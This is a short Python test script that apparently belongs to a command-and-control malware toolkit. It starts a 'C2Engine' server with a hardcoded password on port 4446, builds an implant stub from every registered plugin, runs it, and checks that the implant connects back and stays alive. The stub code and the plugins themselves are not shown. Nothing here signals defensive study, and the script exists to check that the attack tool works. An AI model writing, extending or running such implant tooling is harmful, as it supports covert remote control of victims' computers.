"""Test stub with all plugins - full capture."""
import sys, os, threading, time, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from server import C2Engine
from stub_generator import generate_stub
from plugins import PLUGIN_REGISTRY

engine = C2Engine(password="whisper_secret_key", port=4446)
engine.set_callback("client_added", lambda cid, info: print(f"CLIENT_CONNECTED:{cid}"))
t = threading.Thread(target=engine.start, daemon=True)
t.start()
time.sleep(0.5)

stub = generate_stub(sorted(PLUGIN_REGISTRY.keys()), "127.0.0.1", 4446, "whisper_secret_key", 1)
sp = os.path.join(os.path.dirname(__file__), "build", "_full_stub.py")
os.makedirs(os.path.dirname(sp), exist_ok=True)
with open(sp, "w") as f:
    f.write(stub)

proc = subprocess.Popen(
    [sys.executable, sp],
    stdout=subprocess.PIPE, stderr=subprocess.PIPE
)
time.sleep(5)

alive = proc.poll() is None
out, err = proc.communicate(timeout=2) if not alive else (b"", b"")
print(f"ALIVE:{alive}")
print(f"CLIENTS:{len(engine.clients)}")
if engine.clients:
    cid = list(engine.clients.keys())[0]
    print(f"CID:{cid}")
if out:
    print(f"STDOUT:{out.decode(errors='replace')[:300]}")
if err:
    print(f"STDERR:{err.decode(errors='replace')[:300]}")
proc.kill()
engine.stop()
